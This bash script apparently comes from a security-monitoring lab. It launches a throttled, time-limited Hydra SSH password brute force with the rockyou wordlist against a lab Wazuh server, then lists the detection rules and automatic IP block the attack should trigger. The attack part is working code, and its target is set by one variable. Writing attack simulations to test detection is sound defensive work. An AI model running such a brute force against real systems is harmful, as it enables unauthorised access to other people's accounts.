#!/usr/bin/env bash
# =============================================================================
# Atak 01 — Brute Force SSH
# MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing
# Cel: Wazuh Server (192.168.10.10)
# Wymaga: Hydra, słownik /usr/share/wordlists/rockyou.txt
# Uruchomienie z Kali:  bash 01-brute-force-ssh.sh
# =============================================================================

set -euo pipefail

# -----------------------------------------------------------------------------
# Konfiguracja
# -----------------------------------------------------------------------------
TARGET="${TARGET:-192.168.10.10}"
USER="${USER_LIST:-root}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
THREADS="${THREADS:-4}"          # świadomie wolno — chodzi o wygenerowanie sygnału, nie o realne złamanie
DURATION="${DURATION:-90}"        # ile sekund maksymalnie atakować

# Kolory dla czytelności
GRN='\033[0;32m'; YEL='\033[1;33m'; RED='\033[0;31m'; CLR='\033[0m'

banner() {
    cat <<'EOF'
   ███████╗ ██████╗  ██████╗    ██╗      █████╗ ██████╗
   ██╔════╝██╔═══██╗██╔════╝    ██║     ██╔══██╗██╔══██╗
   ███████╗██║   ██║██║         ██║     ███████║██████╔╝
   ╚════██║██║   ██║██║         ██║     ██╔══██║██╔══██╗
   ███████║╚██████╔╝╚██████╗    ███████╗██║  ██║██████╔╝
   ╚══════╝ ╚═════╝  ╚═════╝    ╚══════╝╚═╝  ╚═╝╚═════╝
   Attack 01 — SSH Brute Force (T1110.001)
EOF
}

banner

# -----------------------------------------------------------------------------
# Pre-checks
# -----------------------------------------------------------------------------
echo -e "${YEL}[*]${CLR} Sprawdzam wymagane narzędzia..."
for bin in hydra nc; do
    if ! command -v "$bin" >/dev/null 2>&1; then
        echo -e "${RED}[!]${CLR} Brak '$bin'. Zainstaluj:  sudo apt install $bin"
        exit 1
    fi
done

if [ ! -f "$WORDLIST" ]; then
    if [ -f "${WORDLIST}.gz" ]; then
        echo -e "${YEL}[*]${CLR} Rozpakowuję $WORDLIST.gz"
        gunzip -k "${WORDLIST}.gz"
    else
        echo -e "${RED}[!]${CLR} Nie znaleziono słownika: $WORDLIST"
        exit 1
    fi
fi

echo -e "${YEL}[*]${CLR} Sprawdzam czy cel ($TARGET:22) jest osiągalny..."
if ! nc -z -w 3 "$TARGET" 22; then
    echo -e "${RED}[!]${CLR} $TARGET:22 nie odpowiada. Sprawdź, czy Wazuh server stoi (vagrant status)."
    exit 1
fi
echo -e "${GRN}[+]${CLR} Cel odpowiada na 22/tcp."

# -----------------------------------------------------------------------------
# Baseline — pojedyncze udane logowanie (porównanie dla analityka)
# -----------------------------------------------------------------------------
echo -e "\n${YEL}[*]${CLR} BASELINE — udane logowanie (powinno wygenerować EID 5715/4624 Successful)"
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    "vagrant@$TARGET" "echo 'baseline-login-OK'; exit" 2>/dev/null || true

sleep 2

# -----------------------------------------------------------------------------
# WŁAŚCIWY ATAK — Hydra z ograniczonymi wątkami
# -----------------------------------------------------------------------------
echo -e "\n${RED}[!]${CLR} START ATAKU: hydra ${THREADS}-thread przez ${DURATION}s"
echo -e "    target = ssh://$TARGET   user = $USER   wordlist = $WORDLIST"
echo -e "    Spodziewane reguły Wazuh: 5710 (single fail), 5712 (multiple), 100110 (custom)"
echo

# `-I` ignoruje restore file z poprzedniej sesji
# `-V` verbose — pokazuje każdą próbę
# `-e nsr` testuje też puste hasło, hasło == user, reversed
# `-t $THREADS` zrównolegnia
# `-W 1` opóźnienie między próbami w sekundach
# timeout 90 — przerywa po DURATION sekund (i tak nie odgadnie hasła `root`)

timeout "$DURATION" hydra \
    -I -V \
    -t "$THREADS" \
    -W 1 \
    -l "$USER" \
    -e nsr \
    -P "$WORDLIST" \
    "ssh://$TARGET" 2>&1 | tee /tmp/hydra-output.log || true

# -----------------------------------------------------------------------------
# Podsumowanie
# -----------------------------------------------------------------------------
echo
echo -e "${GRN}[+]${CLR} Atak zakończony."
attempts=$(grep -c "login:" /tmp/hydra-output.log || echo 0)
echo "    Wykonano ~$attempts prób w ciągu ${DURATION}s."
echo
echo -e "${YEL}[*]${CLR} Sprawdź alerty w dashboardzie Wazuh:"
echo "    https://192.168.10.10  →  Discover  →  filtr  srcip:\"$(hostname -I | awk '{print $1}')\""
echo
echo -e "${YEL}[*]${CLR} Spodziewane (po stronie Wazuh):"
echo "    - Rule 5710 (level 5):  Attempt to login using a non-existent user"
echo "    - Rule 5712 (level 10): Possible attack on the system (multiple failures)"
echo "    - Rule 100110 (level 12, custom): Brute force SSH from external segment"
echo "    - Active Response: firewall-drop (IP blocked 600s)"
